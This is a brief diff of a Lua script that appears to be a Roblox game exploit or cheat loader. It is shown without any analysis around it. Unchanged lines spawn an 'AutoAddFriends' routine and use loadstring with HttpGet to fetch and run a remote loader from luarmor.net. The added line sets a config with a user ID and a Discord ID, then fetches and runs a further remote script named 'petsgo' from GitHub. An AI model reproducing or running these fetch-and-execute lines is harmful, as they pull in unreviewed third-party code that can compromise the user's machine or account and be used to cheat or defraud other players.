@@ -33,3 +33,4 @@ task.spawn(AutoAddFriends)
 
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5653ca0a4685e7d4268329988eefdb21.lua"))()
+_G.Config = { UserID = "a24b2abf-94cc-4408-b64a-dc96756929e1", discord_id = "1120921298860773456" , Note = "Pc", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/petsgo"))()
